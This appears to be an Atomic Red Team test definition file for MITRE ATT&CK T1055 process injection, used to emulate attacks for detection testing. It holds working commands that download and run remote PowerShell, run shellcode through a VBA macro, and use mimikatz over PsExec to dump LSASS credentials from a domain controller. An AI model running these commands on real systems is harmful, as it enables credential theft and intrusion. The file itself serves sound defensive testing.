attack_technique: T1055
display_name: Process Injection
atomic_tests:
    - name: Shellcode execution via VBA
      item_id: T1055-1
      auto_generated_guid: 1c91e740-1729-4329-b779-feba6e71d048
      description: |
        This module injects shellcode into a newly created process and executes. By default the shellcode is created,
        with Metasploit, for use on x86-64 Windows 10 machines.

        Note: Due to the way the VBA code handles memory/pointers/injection, a 64bit installation of Microsoft Office
        is required.
      supported_platforms:
        - windows
      input_arguments:
        txt_path:
            description: Path to file containing VBA macro to run
            type: path
            default: PathToAtomicsFolder\T1055\src\x64\T1055-macrocode.txt
      dependency_executor_name: powershell
      dependencies:
        - description: |
            The 64-bit version of Microsoft Office must be installed
          prereq_command: |
            try {
              $wdApp = New-Object -COMObject "Word.Application"
              $path = $wdApp.Path
              Stop-Process -Name "winword"
              if ($path.contains("(x86)")) { exit 1 } else { exit 0 }
            } catch { exit 1 }
          get_prereq_command: |
            Write-Host "You will need to install Microsoft Word (64-bit) manually to meet this requirement"
        - description: |
            #{txt_path} must exist on disk at specified location
          prereq_command: |
            if (Test-Path #{txt_path}) {exit 0} else {exit 1}
          get_prereq_command: |
            New-Item -Type Directory (split-path #{txt_path}) -ErrorAction ignore | Out-Null
            Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055-macrocode.txt" -OutFile "#{txt_path}"
      executor:
        command: |
            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
            IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
            Invoke-Maldoc -macroFile "#{txt_path}" -officeProduct "Word" -sub "Execute"
        cleanup_command: ""
        name: powershell
        elevation_required: false
    - name: Remote Process Injection in LSASS via mimikatz
      item_id: T1055-2
      auto_generated_guid: 3203ad24-168e-4bec-be36-f79b13ef8a83
      description: |
        Use mimikatz to remotely (via psexec) dump LSASS process content for RID 500 via code injection (new thread).
        Especially useful against domain controllers in Active Directory environments.
        It must be executed in the context of a user who is privileged on remote `machine`.

        The effect of `/inject` is explained in <https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html>
      supported_platforms:
        - windows
      input_arguments:
        machine:
            description: machine to target (via psexec)
            type: string
            default: DC1
        mimikatz_path:
            description: Mimikatz windows executable
            type: path
            default: '%tmp%\mimikatz\x64\mimikatz.exe'
        psexec_path:
            description: Path to PsExec
            type: string
            default: C:\PSTools\PsExec.exe
      dependency_executor_name: powershell
      dependencies:
        - description: |
            Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})
          prereq_command: |
            $mimikatz_path = cmd /c echo #{mimikatz_path}
            if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
          get_prereq_command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"
        - description: |
            PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_path})
          prereq_command: |
            if (Test-Path "#{psexec_path}") { exit 0} else { exit 1}
          get_prereq_command: |
            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
            Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
            Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
            New-Item -ItemType Directory (Split-Path "#{psexec_path}") -Force | Out-Null
            Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_path}" -Force
      executor:
        command: |
            #{psexec_path} /accepteula \\#{machine} -c #{mimikatz_path} "lsadump::lsa /inject /id:500" "exit"
        cleanup_command: ""
        name: command_prompt
        elevation_required: false
    - name: Section View Injection
      item_id: T1055-3
      auto_generated_guid: c6952f41-6cf0-450a-b352-2ca8dae7c178
      description: "This test creates a section object in the local process followed by a local section view.\nThe shellcode is copied into the local section view and a remote section view is created in the target process, pointing to the local section view. \nA thread is then created in the target process, using the remote section view as start address.\n"
      supported_platforms:
        - windows
      input_arguments: {}
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: |
            $notepad = Start-Process notepad -passthru
            Start-Process $PathToAtomicsFolder\T1055\bin\x64\InjectView.exe
        cleanup_command: Stop-Process $notepad.pid
        name: powershell
        elevation_required: false
